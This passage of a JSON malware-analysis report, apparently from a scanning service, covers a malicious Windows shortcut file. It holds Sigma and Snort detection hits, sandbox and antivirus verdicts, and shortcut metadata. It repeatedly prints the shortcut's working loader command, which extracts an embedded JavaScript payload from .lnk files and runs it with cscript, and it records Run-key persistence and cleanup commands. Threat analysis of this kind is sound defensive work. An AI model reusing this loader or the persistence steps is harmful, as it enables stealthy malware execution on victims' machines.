                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-4CC4-650C-6A06-000000003400}",
                "ProcessId": "4128",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Windows host process (Rundll32)",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-4CC3-650C-6906-000000003400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=D7CA562B0DB4F4DD0F03A89A1FDAD63D,SHA256=4E15AA13A02798E924C63537E458A09415C48DAE0E7AFD5A3D25532A2AA935EE,IMPHASH=BB17B2FBBFF4BBF5EBDCA7D0BB9E4A5B",
                "OriginalFileName": "RUNDLL32.EXE",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "6056",
                "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
                "CommandLine": "rundll32.exe  MSADOCG.DLL,DllUnregisterServer",
                "EventID": "1",
                "LogonGuid": "C784477D-4CE5-64E5-4FD4-030000000000",
                "LogonId": "250959",
                "Image": "C:\\Users\\george\\AppData\\Local\\Temp\\rundll32.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "cmd  /c start rundll32.exe MSADOCG.DLL,DllUnregisterServer",
                "UtcTime": "1695304900",
                "RuleName": "-"
              }
            },
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-4CD1-650C-7206-000000003400}",
                "ProcessId": "7400",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Windows host process (Rundll32)",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-4CD1-650C-7106-000000003400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=D7CA562B0DB4F4DD0F03A89A1FDAD63D,SHA256=4E15AA13A02798E924C63537E458A09415C48DAE0E7AFD5A3D25532A2AA935EE,IMPHASH=BB17B2FBBFF4BBF5EBDCA7D0BB9E4A5B",
                "OriginalFileName": "RUNDLL32.EXE",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "7372",
                "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
                "CommandLine": "rundll32.exe  MSADOCG.DLL,DllUnregisterServer",
                "EventID": "1",
                "LogonGuid": "C784477D-4CE5-64E5-ACD4-030000000000",
                "LogonId": "251052",
                "Image": "C:\\Users\\george\\AppData\\Local\\Temp\\rundll32.exe",
                "IntegrityLevel": "Medium",
                "ParentCommandLine": "cmd  /c start rundll32.exe MSADOCG.DLL,DllUnregisterServer",
                "UtcTime": "1695304913",
                "RuleName": "-"
              }
            },
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-4CDA-650C-7806-000000003400}",
                "ProcessId": "4348",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Windows host process (Rundll32)",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-4CD9-650C-7706-000000003400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=D7CA562B0DB4F4DD0F03A89A1FDAD63D,SHA256=4E15AA13A02798E924C63537E458A09415C48DAE0E7AFD5A3D25532A2AA935EE,IMPHASH=BB17B2FBBFF4BBF5EBDCA7D0BB9E4A5B",
                "OriginalFileName": "RUNDLL32.EXE",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "4468",
                "CurrentDirectory": "C:\\Users\\george\\AppData\\Local\\Temp\\",
                "CommandLine": "rundll32.exe  MSADOCG.DLL,DllUnregisterServer",
                "EventID": "1",
                "LogonGuid": "C784477D-4CE5-64E5-ACD4-030000000000",
                "LogonId": "251052",
                "Image": "C:\\Users\\george\\AppData\\Local\\Temp\\rundll32.exe",
                "IntegrityLevel": "Medium",
                "ParentCommandLine": "cmd  /c start rundll32.exe MSADOCG.DLL,DllUnregisterServer",
                "UtcTime": "1695304922",
                "RuleName": "-"
              }
            },
            {
              "values": {
                "EventID": "1",
                "CommandLine": "%TEMP%\\rundll32.exe",
                "Image": "%TEMP%\\rundll32.exe"
              }
            }
          ],
          "rule_level": "high",
          "rule_description": "Detects a Windows program executable started from a suspicious folder",
          "rule_author": "Florian Roth (Nextron Systems), Patrick Bareiss, Anton Kutepov, oscd.community, Nasreddine Bencherchali",
          "rule_id": "25fc56c1bee673d7ff3edcf371e4d2a36c0af83222da348961b87735c8efa61f"
        },
        {
          "rule_title": "New RUN Key Pointing to Suspicious Folder",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "ProcessId": "6044",
                "EventType": "SetValue",
                "Image": "C:\\Windows\\system32\\cscript.exe",
                "ProcessGuid": "{C784477D-4CB0-650C-5E06-000000003400}",
                "UtcTime": "1695304901",
                "Details": "cmd /c start C:\\Users\\george\\AppData\\Local\\Temp\\ctfmon.bat",
                "RuleName": "T1060,RunKey",
                "TargetObject": "HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CTFM0N.EXE"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "cmd /c start %TEMP%\\ctfmon.bat",
                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CTFM0N.EXE"
              }
            }
          ],
          "rule_level": "high",
          "rule_description": "Detects suspicious new RUN key element pointing to an executable in a suspicious folder",
          "rule_author": "Florian Roth (Nextron Systems), Markus Neis, Sander Wiebing",
          "rule_id": "27b72c2678411f21ba21bd10b44b7e9c45594d5a5f61f14223b81a8906675039"
        },
        {
          "rule_title": "Suspicious Script Execution From Temp Folder",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-4CB0-650C-5E06-000000003400}",
                "ProcessId": "6044",
                "Product": "Microsoft \\xae Windows Script Host",
                "Description": "Microsoft \\xae Console Based Script Host",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-4CB0-650C-5A06-000000003400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=956185CAF895737F30E8EE24DEFCE8E6,SHA256=0E54A952CD1C5CECBAC0B00155F6094939484C47CE130AAC3441058DA60BAFA5,IMPHASH=AC41732425A8C1DC99B4B3CE314D9654",
                "OriginalFileName": "cscript.exe",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "FileVersion": "5.812.10240.16384",
                "ParentProcessId": "4624",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "cscript  C:\\Users\\george\\AppData\\Local\\Temp\\~654412541.js 8",
                "EventID": "1",
                "LogonGuid": "C784477D-4CE5-64E5-4FD4-030000000000",
                "LogonId": "250959",
                "Image": "C:\\Windows\\System32\\cscript.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c DIR 019638301809816279920654421064\\03926480871963238705 & for /f \"delims=\" %a in ('dir /S/b *.lnk C:\\Users\\george\\AppData\\Local\\Temp\\*.lnk') do (if %~za gtr 84506 (findstr /b \"var onm=\" \"%a\" > C:\\Users\\george\\AppData\\Local\\Temp\\~654412541.js & cscript C:\\Users\\george\\AppData\\Local\\Temp\\~654412541.js 8&exit))&cls",
                "UtcTime": "1695304880",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "high",
          "rule_description": "Detects a suspicious script executions from temporary folder",
          "rule_author": "Florian Roth (Nextron Systems), Max Altgelt (Nextron Systems), Tim Shelton",
          "rule_id": "96d2c399118cab5d249093badf4a85f0ef1889872b0191bdf131bcabc0994681"
        },
        {
          "rule_title": "Files With System Process Name In Unsuspected Locations",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TargetFilename": "%TEMP%\\rundll32.exe"
              }
            }
          ],
          "rule_level": "high",
          "rule_description": "Detects the creation of an executable with a system process name in folders other than the system ones (System32, SysWOW64...etc).",
          "rule_author": "Sander Wiebing, Tim Shelton, Nasreddine Bencherchali (Nextron Systems)",
          "rule_id": "e13498937de9343f50c1e8f315ce602aa238e37e21f3dbb15d3403c25afafe3e"
        },
        {
          "rule_title": "CurrentVersion Autorun Keys Modification",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "ProcessId": "6044",
                "EventType": "SetValue",
                "Image": "C:\\Windows\\system32\\cscript.exe",
                "ProcessGuid": "{C784477D-4CB0-650C-5E06-000000003400}",
                "UtcTime": "1695304901",
                "Details": "cmd /c start C:\\Users\\george\\AppData\\Local\\Temp\\ctfmon.bat",
                "RuleName": "T1060,RunKey",
                "TargetObject": "HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CTFM0N.EXE"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "cmd /c start %TEMP%\\ctfmon.bat",
                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\CTFM0N.EXE"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects modification of autostart extensibility point (ASEP) in registry.",
          "rule_author": "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)",
          "rule_id": "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc"
        },
        {
          "rule_title": "Suspicious CMD Shell Output Redirect",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-4CB0-650C-5A06-000000003400}",
                "ProcessId": "4624",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Windows Command Processor",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-4CE5-64E5-6A00-000000003400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
                "OriginalFileName": "Cmd.Exe",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "4904",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c DIR 019638301809816279920654421064\\03926480871963238705 & for /f \"delims=\" %%a in ('dir /S/b *.lnk C:\\Users\\george\\AppData\\Local\\Temp\\*.lnk') do (if %%~za gtr 84506 (findstr /b \"var onm=\" \"%%a\" > C:\\Users\\george\\AppData\\Local\\Temp\\~654412541.js & cscript C:\\Users\\george\\AppData\\Local\\Temp\\~654412541.js 8&exit))&cls",
                "EventID": "1",
                "LogonGuid": "C784477D-4CE5-64E5-4FD4-030000000000",
                "LogonId": "250959",
                "Image": "C:\\Windows\\System32\\cmd.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
                "UtcTime": "1695304880",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects inline Windows shell commands redirecting output via the \">\" symbol to a suspicious location",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
          "rule_id": "9312dc563b7e9a010a22b457fb7cd94e9c686b75dc20fcf8a10236dda0e5e2b4"
        },
        {
          "rule_title": "Files And Subdirectories Listing Using Dir",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-4CB0-650C-5A06-000000003400}",
                "ProcessId": "4624",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Windows Command Processor",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-4CE5-64E5-6A00-000000003400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
                "OriginalFileName": "Cmd.Exe",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "4904",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c DIR 019638301809816279920654421064\\03926480871963238705 & for /f \"delims=\" %%a in ('dir /S/b *.lnk C:\\Users\\george\\AppData\\Local\\Temp\\*.lnk') do (if %%~za gtr 84506 (findstr /b \"var onm=\" \"%%a\" > C:\\Users\\george\\AppData\\Local\\Temp\\~654412541.js & cscript C:\\Users\\george\\AppData\\Local\\Temp\\~654412541.js 8&exit))&cls",
                "EventID": "1",
                "LogonGuid": "C784477D-4CE5-64E5-4FD4-030000000000",
                "LogonId": "250959",
                "Image": "C:\\Windows\\System32\\cmd.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
                "UtcTime": "1695304880",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "low",
          "rule_description": "Detects usage of the \"dir\" command that is part of Windows batch/cmd to collect information about directories",
          "rule_author": "frack113",
          "rule_id": "7752bbd4e940ef58081260cfa45b4ac6b149e2cecb836d79f5e61bfbdc237105"
        },
        {
          "rule_title": "File Deletion Via Del",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-4CC5-650C-6B06-000000003400}",
                "ProcessId": "6248",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Windows Command Processor",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-4CB0-650C-5E06-000000003400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
                "OriginalFileName": "Cmd.Exe",
                "ParentImage": "C:\\Windows\\System32\\cscript.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "6044",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c del /q C:\\Users\\george\\AppData\\Local\\Temp\\~654412541.js",
                "EventID": "1",
                "LogonGuid": "C784477D-4CE5-64E5-4FD4-030000000000",
                "LogonId": "250959",
                "Image": "C:\\Windows\\System32\\cmd.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "cscript  C:\\Users\\george\\AppData\\Local\\Temp\\~654412541.js 8",
                "UtcTime": "1695304901",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "low",
          "rule_description": "Detects execution of the builtin \"del\"/\"erase\" commands in order to delete files.\nAdversaries may delete files left behind by the actions of their intrusion activity.\nMalware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\nRemoval of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n",
          "rule_author": "frack113",
          "rule_id": "77ed185ff979a8d9206b5eed07bf6d5823529f713ed0ea19f2ef7a4a355568bc"
        },
        {
          "rule_title": "Modification of IE Registry Settings",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "0x00000000",
                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4\\1C00"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "0x00000003",
                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\TemplatePolicies\\High\\1400"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "0x00000003",
                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\4\\1400"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "0x00000006",
                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Passport\\NumRegistrationRuns"
              }
            }
          ],
          "rule_level": "low",
          "rule_description": "Detects modification of the registry settings used for Internet Explorer and other Windows components that use these settings. An attacker can abuse this registry key to add a domain to the trusted sites Zone or insert javascript for persistence",
          "rule_author": "frack113",
          "rule_id": "7ca43f2acf2c039e776af286dca2b5216d23967e6e8fe43dd5a5cc95f86e52e5"
        },
        {
          "rule_title": "CMD Shell Output Redirect",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-4CB0-650C-5A06-000000003400}",
                "ProcessId": "4624",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Description": "Windows Command Processor",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-4CE5-64E5-6A00-000000003400}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
                "OriginalFileName": "Cmd.Exe",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "ParentProcessId": "4904",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c DIR 019638301809816279920654421064\\03926480871963238705 & for /f \"delims=\" %%a in ('dir /S/b *.lnk C:\\Users\\george\\AppData\\Local\\Temp\\*.lnk') do (if %%~za gtr 84506 (findstr /b \"var onm=\" \"%%a\" > C:\\Users\\george\\AppData\\Local\\Temp\\~654412541.js & cscript C:\\Users\\george\\AppData\\Local\\Temp\\~654412541.js 8&exit))&cls",
                "EventID": "1",
                "LogonGuid": "C784477D-4CE5-64E5-4FD4-030000000000",
                "LogonId": "250959",
                "Image": "C:\\Windows\\System32\\cmd.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
                "UtcTime": "1695304880",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "low",
          "rule_description": "Detects the use of the redirection character \">\" to redicrect information in commandline",
          "rule_author": "frack113",
          "rule_id": "e77646c39db7fa011a5223aeb73c738046787fc7f62a99394e883d76a54341f7"
        }
      ],
      "reputation": 0,
      "crowdsourced_ids_stats": {
        "high": 0,
        "info": 0,
        "medium": 1,
        "low": 5
      },
      "trid": [
        {
          "file_type": "Windows Shortcut",
          "probability": 100
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 4,
          "medium": 2,
          "critical": 0,
          "low": 4
        }
      },
      "sandbox_verdicts": {
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        },
        "Dr.Web vxCube": {
          "category": "malicious",
          "sandbox_name": "Dr.Web vxCube",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "f3ea4611c72d57eabf381d5639c3c8d1840cb005ed811f3038410fb2e04978c1",
      "type_extension": "lnk",
      "tags": [
        "long-command-line-arguments",
        "hiding-window",
        "detect-debug-environment",
        "high-entropy",
        "lnk",
        "long-sleeps",
        "large-file",
        "persistence",
        "executes-dropped-file"
      ],
      "crowdsourced_ids_results": [
        {
          "rule_category": "successful-recon-limited",
          "alert_severity": "medium",
          "rule_msg": "PROTOCOL-ICMP Unusual PING detected",
          "rule_raw": "alert icmp $HOME_NET any -> $EXTERNAL_NET any ( msg:\"PROTOCOL-ICMP Unusual PING detected\"; icode:0; itype:8; fragbits:!M; content:!\"ABCDEFGHIJKLMNOPQRSTUVWABCDEFGHI\",depth 32; content:!\"0123456789abcdefghijklmnopqrstuv\",depth 32; content:!\"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\",depth 36; content:!\"WANG2\"; content:!\"cacti-monitoring-system\",depth 65; content:!\"SolarWinds\",depth 72; metadata:policy max-detect-ips drop,ruleset community; reference:url,krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/; reference:url,krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/; classtype:successful-recon-limited; sid:29456; rev:3; )",
          "rule_references": [
            "https://krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/",
            "https://krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/"
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:29456"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET DNS Query to a .tk domain - Likely Hostile",
          "rule_raw": "alert dns $HOME_NET any -> any any (msg:\"ET DNS Query to a .tk domain - Likely Hostile\"; dns.query; content:\".tk\"; fast_pattern; nocase; endswith; content:!\"www.google.tk\"; classtype:bad-unknown; sid:2012811; rev:7; metadata:created_at 2011_05_15, former_category DNS, updated_at 2020_09_17;)",
          "alert_context": [
            {
              "dest_ip": "8.8.8.8",
              "dest_port": 53
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2012811"
        },
        {
          "rule_category": "misc-activity",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP PING Windows",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP PING Windows\"; itype:8; content:\"abcdefghijklmnop\",depth 16; metadata:ruleset community; classtype:misc-activity; sid:382; rev:11; )",
          "rule_id": "1:382"
        },
        {
          "rule_category": "misc-activity",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP PING",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP PING\"; icode:0; itype:8; metadata:ruleset community; classtype:misc-activity; sid:384; rev:8; )",
          "rule_id": "1:384"
        },
        {
          "rule_category": "misc-activity",
          "alert_severity": "low",
          "rule_msg": "INDICATOR-COMPROMISE Suspicious .tk dns query",
          "rule_raw": "alert udp $HOME_NET any -> any 53 ( msg:\"INDICATOR-COMPROMISE Suspicious .tk dns query\"; flow:to_server; byte_test:1,!&,0xF8,2; content:\"|02|tk|00|\",fast_pattern,nocase; metadata:policy max-detect-ips drop,policy security-ips drop; service:dns; reference:url,en.wikipedia.org/wiki/.tk; classtype:misc-activity; sid:39867; rev:4; )",
          "rule_references": [
            "https://en.wikipedia.org/wiki/.tk"
          ],
          "alert_context": [
            {
              "dest_ip": "8.8.8.8",
              "dest_port": 53
            }
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:39867"
        },
        {
          "rule_category": "misc-activity",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP Echo Reply",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP Echo Reply\"; icode:0; itype:0; metadata:ruleset community; classtype:misc-activity; sid:408; rev:8; )",
          "rule_id": "1:408"
        }
      ],
      "lnk_info": {
        "mac_vendor_name": "Microsoft Corporation",
        "machine_id": "win-5jkmu7vuhc3",
        "link_flags": [
          "HasTargetIDList",
          "HasLinkInfo",
          "HasRelativePath",
          "IsUnicode",
          "HasExprString",
          "HasArguments",
          "HasIconLocation"
        ],
        "modification_date": "2010-11-21T03:24:06.698856Z",
        "command_line_arguments": "/c DIR 019638301809816279920654421064\\03926480871963238705 & for /f \"delims=\" %a in ('dir /S/b *.lnk %temp%\\*.lnk') do (if %~za gtr 84506 (findstr /b \"var onm=\" \"%a\" > %temp%\\~654412541.js & cscript %temp%\\~654412541.js 8&exit))&cls",
        "icon_location": ".\\1963237625.docx",
        "creation_date": "2010-11-21T03:24:06.698856Z",
        "target_path": "My Computer (Computer) : C:\\Windows\\System32\\cmd.exe",
        "relative_path": "..\\..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe",
        "local_path": "C:\\Windows\\System32\\cmd.exe",
        "mac_address": "00:15:5d:4d:c8:86",
        "access_date": "2010-11-21T03:24:06.698856Z",
        "volume_serial_number": "748e-3e12"
      },
      "last_analysis_date": 1701967167,
      "unique_sources": 3,
      "first_submission_date": 1695279596,
      "ssdeep": "12288:l801pGgGxWiTOah4HbpA8xcEqK8kufvqTuO/2nn6TSkQxg:a+GYiSah4c+tuXT42nnUSkeg",
      "md5": "cfe4a2fc19b77dea154c106918dcc1a3",
      "sha1": "3a4eb198f5a671ef38a646485f7390e1d5c3edaa",
      "magic": "MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has command line arguments, Icon number=0, Archive, ctime=Sun Nov 21 03:24:06 2010, mtime=Sun Nov 21 03:24:06 2010, atime=Sun Nov 21 03:24:06 2010, length=302592, window=hidenormalshowminimized",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 15,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 36,
        "undetected": 25
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.WinLNK.Droid.4!c",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "Lnk.Trojan.A9903594",
          "method": "blacklist",
          "engine_update": "20231206"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "BehavesLike.Trojan.jl",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.Agent.LNK.Gen",
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5009",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231122"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.130.50390",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.130.50390",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231204"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.595",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231207"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
